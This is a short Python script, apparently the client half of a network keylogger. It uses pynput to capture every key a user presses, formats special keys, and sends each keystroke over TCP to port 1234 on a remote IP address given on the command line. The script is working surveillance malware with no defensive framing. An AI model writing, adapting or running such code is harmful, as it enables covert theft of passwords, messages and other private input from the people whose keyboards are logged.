#!/usr/bin/env python3
"""
Usage: ./client.py <ip>
* ./client.py localhost
* ./client.py 192.168.0.103
"""

import sys
import socket
import pynput
from pynput.keyboard import Key, Listener


def on_press(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.shift":
        key = ""
    elif key == "Key.backspace":
        key = " [Backspace] "
    elif key == "Key.esc":
        key = " [Escape] "
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((str(sys.argv[1]), 1234))
    client.send(key.encode("utf-8"))


with Listener(on_press=on_press) as listener:
    listener.join()
